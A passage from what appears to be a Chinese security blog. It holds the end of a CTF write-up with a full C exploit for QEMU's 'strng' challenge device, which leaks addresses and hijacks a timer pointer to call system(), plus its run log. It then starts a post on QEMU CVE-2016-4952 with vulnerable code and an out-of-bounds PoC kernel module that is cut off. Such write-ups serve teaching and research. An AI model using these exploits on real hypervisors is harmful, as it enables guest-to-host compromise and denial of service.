<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span>* mmio_mem;</span><br><span class="line"><span class="keyword">uint32_t</span> pmio_base=<span class="number">0xc050</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">die</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    perror(msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mmio_write</span><span class="params">(<span class="keyword">uint32_t</span> addr, <span class="keyword">uint32_t</span> value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    *((<span class="keyword">uint32_t</span>*)(mmio_mem + addr)) = value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint32_t</span> <span class="title">mmio_read</span><span class="params">(<span class="keyword">uint32_t</span> addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> *((<span class="keyword">uint32_t</span>*)(mmio_mem + addr));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">pmio_write</span><span class="params">(<span class="keyword">uint32_t</span> addr, <span class="keyword">uint32_t</span> value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    outl(value, addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint32_t</span> <span class="title">pmio_read</span><span class="params">(<span class="keyword">uint32_t</span> addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">uint32_t</span>)inl(addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint32_t</span> <span class="title">pmio_arbread</span><span class="params">(<span class="keyword">uint32_t</span> offset)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    pmio_write(pmio_base+<span class="number">0</span>, offset);</span><br><span class="line">    <span class="keyword">return</span> pmio_read(pmio_base+<span class="number">4</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">pmio_arbwrite</span><span class="params">(<span class="keyword">uint32_t</span> offset, <span class="keyword">uint32_t</span> value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    pmio_write(pmio_base+<span class="number">0</span>, offset);</span><br><span class="line">    pmio_write(pmio_base+<span class="number">4</span>, value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// Open and map I/O memory for the strng device</span></span><br><span class="line">    <span class="keyword">int</span> mmio_fd = open(<span class="string">&quot;/sys/devices/pci0000:00/0000:00:04.0/resource0&quot;</span>, O_RDWR | O_SYNC);</span><br><span class="line">    <span class="keyword">if</span> (mmio_fd == <span class="number">-1</span>)</span><br><span class="line">        die(<span class="string">&quot;mmio_fd open failed&quot;</span>);</span><br><span class="line"></span><br><span class="line">    mmio_mem = (<span class="keyword">char</span>*)mmap(<span class="number">0</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (mmio_mem == MAP_FAILED)</span><br><span class="line">        die(<span class="string">&quot;mmap mmio_mem failed&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;mmio_mem @ %p\n&quot;</span>, mmio_mem);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Open and map I/O memory for the strng device</span></span><br><span class="line">    <span class="keyword">if</span> (iopl(<span class="number">3</span>) !=<span class="number">0</span> )</span><br><span class="line">        die(<span class="string">&quot;I/O permission is not enough&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// leak elf base addr</span></span><br><span class="line">    <span class="keyword">uint64_t</span> cb_addr = pmio_arbread(<span class="number">0x114</span>);</span><br><span class="line">    cb_addr = cb_addr &lt;&lt; <span class="number">32</span>;</span><br><span class="line">    cb_addr += pmio_arbread(<span class="number">0x110</span>);</span><br><span class="line">    <span class="keyword">uint64_t</span> elf_base = cb_addr - <span class="number">0x29ac8e</span>;</span><br><span class="line">    <span class="keyword">uint64_t</span> system_addr = elf_base + <span class="number">0x200D50</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] leak cb addr: 0x%lx\n&quot;</span>, cb_addr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] elf base: 0x%lx\n&quot;</span>, elf_base);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] system addr: 0x%lx\n&quot;</span>, system_addr);</span><br><span class="line">    <span class="comment">// leak opaque addr</span></span><br><span class="line">    <span class="keyword">uint64_t</span> opaque_addr = pmio_arbread(<span class="number">0x11c</span>);</span><br><span class="line">    opaque_addr = opaque_addr &lt;&lt; <span class="number">32</span>;</span><br><span class="line">    opaque_addr += pmio_arbread(<span class="number">0x118</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] leak opaque addr: 0x%lx\n&quot;</span>, opaque_addr);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// write parameter addr first</span></span><br><span class="line">    <span class="keyword">uint64_t</span> para_addr = opaque_addr + <span class="number">0xb04</span>;</span><br><span class="line">    pmio_arbwrite(<span class="number">0x118</span>, para_addr &amp; <span class="number">0xffffffff</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// set flag first and then overwrite timer func pointer and trigger timer</span></span><br><span class="line">    mmio_write(<span class="number">12</span>,<span class="number">0x20746163</span>); <span class="comment">// &#x27;cat &#x27;</span></span><br><span class="line">    mmio_write(<span class="number">16</span>, <span class="number">0x67616c66</span>); <span class="comment">// &#x27;flag&#x27;</span></span><br><span class="line">    pmio_arbwrite(<span class="number">0x110</span>, system_addr &amp; <span class="number">0xffffffff</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] flag: \n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>编译方法：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ gcc -O0 -static -o exploit exploit.c</span><br></pre></td></tr></table></figure>
<p>因为题目使用的busybox没有库文件，因此要用静态编译。编译后将exploit复制到rootfs/pwn目录中执行如下打包命令：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$ cd rootfs</span><br><span class="line">$ find . | cpio -H newc -ov -F ..&#x2F;rootfs.cpio</span><br><span class="line">$ cd ..</span><br><span class="line">$ sudo .&#x2F;launch.sh</span><br><span class="line">...</span><br><span class="line"># &#x2F;pwn&#x2F;exploit</span><br><span class="line">mmio_mem @ 0x7fed0d087000</span><br><span class="line">[+] leak cb addr: 0x5566c08f4c8e</span><br><span class="line">[+] elf base: 0x5566c065a000</span><br><span class="line">[+] system addr: 0x5566c085ad50</span><br><span class="line">[+] leak opaque addr: 0x5566c26b9bd0</span><br><span class="line">[+] flag: </span><br><span class="line"># flag&#123;f4nr0ng1992&#125;</span><br></pre></td></tr></table></figure>
<p>调试方法和之前的文章稍有差别：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ sudo gdb qemu-system-x86_64</span><br><span class="line">(gdb) b strng_mmio_read</span><br><span class="line">(gdb) b strng_mmio_write</span><br><span class="line">(gdb) b strng_pmio_read</span><br><span class="line">(gdb) b strng_pmio_write</span><br><span class="line">(gdb) run -initrd .&#x2F;rootfs.cpio -kernel .&#x2F;vmlinuz-4.8.0-52-generic -append &#39;console&#x3D;ttyS0 root&#x3D;&#x2F;dev&#x2F;ram oops&#x3D;panic panic&#x3D;1&#39; -enable-kvm -monitor &#x2F;dev&#x2F;null -m 64M --nographic -L .&#x2F;dependency&#x2F;usr&#x2F;local&#x2F;share&#x2F;qemu -L pc-bios -device strng</span><br></pre></td></tr></table></figure>
<p><strong>reference</strong><br><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/197650">https://www.anquanke.com/post/id/197650</a><br><a target="_blank" rel="noopener" href="https://www.xd10086.com/posts/2010703677257798825/">https://www.xd10086.com/posts/2010703677257798825/</a>  </p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
    <link itemprop="mainEntityOfPage" href="http://example.com/2020/02/02/%E8%B0%83%E8%AF%95Qemu-CVE-2016-4952/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="Bruce Fan">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="BruceFan's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2020/02/02/%E8%B0%83%E8%AF%95Qemu-CVE-2016-4952/" class="post-title-link" itemprop="url">调试Qemu CVE-2016-4952</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建于：2020-02-02 10:29:57" itemprop="dateCreated datePublished" datetime="2020-02-02T10:29:57+08:00">2020-02-02</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="更新于：2020-11-12 10:26:14" itemprop="dateModified" datetime="2020-11-12T10:26:14+08:00">2020-11-12</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <blockquote>
<p>环境：<br>Mac: VMware Fusion<br>VMware: Ubuntu 18.10 x64 4G 开启Intel VT-x/EPT支持 qemu-2.3.0<br>qemu: Ubuntu 18.04 x64 2G</p>
</blockquote>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>虚拟硬件设备是Qemu-KVM中最大的攻击面，本文介绍的漏洞就是一个很典型的例子。根据<a target="_blank" rel="noopener" href="https://bugzilla.redhat.com/show_bug.cgi?id=1334384">CVE-2016-4952</a>的描述，这是一个OOB r/w access漏洞。当处理SCSI的<code>PVSCSI_CMD_SETUP_RINGS</code>或<code>PVSCSI_CMD_SETUP_MSG_RING</code>命令时即可触发漏洞，Guest中的root用户可以利用这个漏洞造成DoS攻击。<br>首先看一下漏洞的<a target="_blank" rel="noopener" href="https://lists.gnu.org/archive/html/qemu-devel/2016-05/msg03774.html">patch</a>(hw/scsi/vmw_pvscsi.c)：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">+<span class="keyword">static</span> <span class="keyword">int</span></span><br><span class="line"> pvscsi_ring_init_data(PVSCSIRingInfo *m, PVSCSICmdDescSetupRings *ri)</span><br><span class="line"> &#123;</span><br><span class="line"> ...</span><br><span class="line"> +    <span class="keyword">if</span> ((ri-&gt;reqRingNumPages &gt; PVSCSI_SETUP_RINGS_MAX_NUM_PAGES)</span><br><span class="line"> +        || (ri-&gt;cmpRingNumPages &gt; PVSCSI_SETUP_RINGS_MAX_NUM_PAGES)) &#123;</span><br><span class="line"> +        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"> +    &#125;</span><br><span class="line"> ...</span><br><span class="line"> &#125;</span><br><span class="line">+<span class="keyword">static</span> <span class="keyword">int</span></span><br><span class="line"> pvscsi_ring_init_msg(PVSCSIRingInfo *m, PVSCSICmdDescSetupMsgRing *ri)</span><br><span class="line"> &#123;</span><br><span class="line"> ...</span><br><span class="line"> +    <span class="keyword">if</span> (ri-&gt;numPages &gt; PVSCSI_SETUP_MSG_RING_MAX_NUM_PAGES) &#123;</span><br><span class="line"> +        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"> +    &#125;</span><br><span class="line"> ...</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
<p>触发流程如下：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">pvscsi_io_write(<span class="keyword">void</span> *opaque, hwaddr addr,</span><br><span class="line">                <span class="keyword">uint64_t</span> val, <span class="keyword">unsigned</span> size)</span><br><span class="line">&#123;</span><br><span class="line">    PVSCSIState *s = opaque;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (addr) &#123;</span><br><span class="line">    <span class="keyword">case</span> PVSCSI_REG_OFFSET_COMMAND:</span><br><span class="line">        pvscsi_on_command(s, val);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> PVSCSI_REG_OFFSET_COMMAND_DATA:</span><br><span class="line">        pvscsi_on_command_data(s, (<span class="keyword">uint32_t</span>) val);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">pvscsi_on_command_data(PVSCSIState *s, <span class="keyword">uint32_t</span> value)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">size_t</span> bytes_arrived = s-&gt;curr_cmd_data_cntr * <span class="keyword">sizeof</span>(<span class="keyword">uint32_t</span>);</span><br><span class="line"></span><br><span class="line">    assert(bytes_arrived &lt; <span class="keyword">sizeof</span>(s-&gt;curr_cmd_data));</span><br><span class="line">    s-&gt;curr_cmd_data[s-&gt;curr_cmd_data_cntr++] = value;</span><br><span class="line"></span><br><span class="line">    pvscsi_do_command_processing(s);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">pvscsi_on_command(PVSCSIState *s, <span class="keyword">uint64_t</span> cmd_id)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> ((cmd_id &gt; PVSCSI_CMD_FIRST) &amp;&amp; (cmd_id &lt; PVSCSI_CMD_LAST)) &#123;</span><br><span class="line">        s-&gt;curr_cmd = cmd_id;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        s-&gt;curr_cmd = PVSCSI_CMD_FIRST;</span><br><span class="line">        trace_pvscsi_on_cmd_unknown(cmd_id);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    s-&gt;curr_cmd_data_cntr = <span class="number">0</span>;</span><br><span class="line">    s-&gt;reg_command_status = PVSCSI_COMMAND_NOT_ENOUGH_DATA;</span><br><span class="line"></span><br><span class="line">    pvscsi_do_command_processing(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span>       data_size;</span><br><span class="line">    <span class="keyword">uint64_t</span>  (*handler_fn)(PVSCSIState *s);</span><br><span class="line">&#125; pvscsi_commands[] = &#123;</span><br><span class="line">	...</span><br><span class="line">    [PVSCSI_CMD_SETUP_RINGS] = &#123;</span><br><span class="line">        .data_size = <span class="keyword">sizeof</span>(PVSCSICmdDescSetupRings),</span><br><span class="line">        .handler_fn = pvscsi_on_cmd_setup_rings,</span><br><span class="line">    &#125;,</span><br><span class="line">    ...</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">pvscsi_do_command_processing(PVSCSIState *s)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">size_t</span> bytes_arrived = s-&gt;curr_cmd_data_cntr * <span class="keyword">sizeof</span>(<span class="keyword">uint32_t</span>);</span><br><span class="line"></span><br><span class="line">    assert(s-&gt;curr_cmd &lt; PVSCSI_CMD_LAST);</span><br><span class="line">    <span class="keyword">if</span> (bytes_arrived &gt;= pvscsi_commands[s-&gt;curr_cmd].data_size) &#123;</span><br><span class="line">        s-&gt;reg_command_status = pvscsi_commands[s-&gt;curr_cmd].handler_fn(s);</span><br><span class="line">        s-&gt;curr_cmd = PVSCSI_CMD_FIRST;</span><br><span class="line">        s-&gt;curr_cmd_data_cntr   = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">uint64_t</span></span><br><span class="line">pvscsi_on_cmd_setup_rings(PVSCSIState *s)</span><br><span class="line">&#123;</span><br><span class="line">    PVSCSICmdDescSetupRings *rc =</span><br><span class="line">        (PVSCSICmdDescSetupRings *) s-&gt;curr_cmd_data;</span><br><span class="line"></span><br><span class="line">    trace_pvscsi_on_cmd_arrived(<span class="string">&quot;PVSCSI_CMD_SETUP_RINGS&quot;</span>);</span><br><span class="line"></span><br><span class="line">    pvscsi_dbg_dump_tx_rings_config(rc);</span><br><span class="line">    pvscsi_ring_init_data(&amp;s-&gt;rings, rc);</span><br><span class="line">    s-&gt;rings_info_valid = TRUE;</span><br><span class="line">    <span class="keyword">return</span> PVSCSI_COMMAND_PROCESSING_SUCCEEDED;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">PVSCSICmdDescSetupRings</span> &#123;</span></span><br><span class="line">    <span class="keyword">uint32_t</span>    reqRingNumPages;</span><br><span class="line">    <span class="keyword">uint32_t</span>    cmpRingNumPages;</span><br><span class="line">    <span class="keyword">uint64_t</span>    ringsStatePPN;</span><br><span class="line">    <span class="keyword">uint64_t</span>    reqRingPPNs[PVSCSI_SETUP_RINGS_MAX_NUM_PAGES];</span><br><span class="line">    <span class="keyword">uint64_t</span>    cmpRingPPNs[PVSCSI_SETUP_RINGS_MAX_NUM_PAGES];</span><br><span class="line">&#125; QEMU_PACKED;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">pvscsi_ring_init_data(PVSCSIRingInfo *m, PVSCSICmdDescSetupRings *ri)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">uint32_t</span> txr_len_log2, rxr_len_log2;</span><br><span class="line">    <span class="keyword">uint32_t</span> req_ring_size, cmp_ring_size;</span><br><span class="line">    m-&gt;rs_pa = ri-&gt;ringsStatePPN &lt;&lt; VMW_PAGE_SHIFT;</span><br><span class="line"></span><br><span class="line">    req_ring_size = ri-&gt;reqRingNumPages * PVSCSI_MAX_NUM_REQ_ENTRIES_PER_PAGE;</span><br><span class="line">    cmp_ring_size = ri-&gt;cmpRingNumPages * PVSCSI_MAX_NUM_CMP_ENTRIES_PER_PAGE;</span><br><span class="line">	...</span><br><span class="line">*   <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; ri-&gt;reqRingNumPages; i++) &#123;</span><br><span class="line">*       m-&gt;req_ring_pages_pa[i] = ri-&gt;reqRingPPNs[i] &lt;&lt; VMW_PAGE_SHIFT;</span><br><span class="line">*   &#125;</span><br><span class="line"></span><br><span class="line">*   <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; ri-&gt;cmpRingNumPages; i++) &#123;</span><br><span class="line">*       m-&gt;cmp_ring_pages_pa[i] = ri-&gt;cmpRingPPNs[i] &lt;&lt; VMW_PAGE_SHIFT;</span><br><span class="line">*   &#125;</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>漏洞原因：在执行<code>pvscsi_on_cmd_setup_rings</code>时，未对用户输入的命令参数进行足够的检查，当其中代表长度的字段过大时，会导致OOB。<br>CVE-2016-4952的PoC如下：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;asm/io.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/slab.h&gt;</span></span></span><br><span class="line"><span class="keyword">uint64_t</span> pmem;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">m_init</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    printk(<span class="string">&quot;m_init\n&quot;</span>);</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">int</span> *context;</span><br><span class="line">    pmem = ioremap(<span class="number">0xfebf0000</span>,<span class="number">0x1000</span>);</span><br><span class="line">    context = kmalloc(<span class="number">0x1000</span>,GFP_KERNEL);</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">0x100</span>;i++)</span><br><span class="line">        context[i]=<span class="number">0x41414141</span>;</span><br><span class="line">    <span class="keyword">if</span>(pmem)&#123;</span><br><span class="line">        writel(<span class="number">3</span>,pmem);</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">0x100</span>;i++)</span><br><span class="line">            writel(context[i],pmem+<span class="number">0x4</span>);</span><br><span class="line">        iounmap(pmem);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        printk(<span class="string">&quot;ioremap fail\n&quot;</span>);</span><br><span class="line">    kfree(context);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span 